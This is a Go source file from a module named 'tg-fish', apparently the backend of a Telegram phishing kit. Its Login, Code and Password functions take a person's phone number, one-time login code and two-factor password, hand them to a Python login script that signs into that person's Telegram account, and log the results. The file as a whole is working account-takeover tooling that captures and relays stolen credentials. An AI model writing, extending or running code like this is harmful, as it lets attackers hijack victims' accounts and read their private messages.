package telegram

import (
	// "bufio"
	// "fmt"
	// "io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"

	// "time"

	"gamch1k.org/tg-fish/cmd/pkg/utils"
)

var users []utils.User

func Login(phone string) {

	outb, _ := exec.Command(
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "venv", "bin", "python3.10"),
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "login.py"),
		"-id_api", os.Getenv("APP_ID"),
		"-hash_api", os.Getenv("APP_HASH"),
		"-phone", phone,
		"-code", "0",
		"-hash", "0",
		"-pass", "0",

	).Output()
	
	out := strings.ReplaceAll(string(outb), "\n", "")

	log.Println(out)

	idx := slices.IndexFunc(users, func(c utils.User) bool { return c.Phone == phone })

	if idx == -1 {
		users = append(users, utils.User{ Phone: phone, Hash: out })
		log.Println(users)
		return
	}
	
	users[idx] = utils.User{ Phone: phone, Hash: string(out) }
}

func Code(phone string, code string) bool {
	idx := slices.IndexFunc(users, func(c utils.User) bool { return c.Phone == phone })
	users[idx].Code = code
	user := users[idx]
	
	out, _ := exec.Command(
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "venv", "bin", "python3.10"),
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "login.py"),
		"-id_api", os.Getenv("APP_ID"),
		"-hash_api", os.Getenv("APP_HASH"),
		"-phone", phone,
		"-code", code,
		"-hash", user.Hash,
		"-pass", "0",

	).Output()

	log.Println(string(out))
	return !strings.Contains(string(out), "2af")
}


func Password(phone string, password string) bool {
	idx := slices.IndexFunc(users, func(c utils.User) bool { return c.Phone == phone })
	
	user := users[idx]
	
	out, _ := exec.Command(
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "venv", "bin", "python3.10"),
		filepath.Join("cmd", "back-end", "internal", "telegram", "python", "login.py"),
		"-id_api", os.Getenv("APP_ID"),
		"-hash_api", os.Getenv("APP_HASH"),
		"-phone", phone,
		"-code", user.Code,
		"-hash", user.Hash,
		"-pass", password,

	).Output()

	log.Println(string(out))
	return strings.Contains(string(out), "login")
}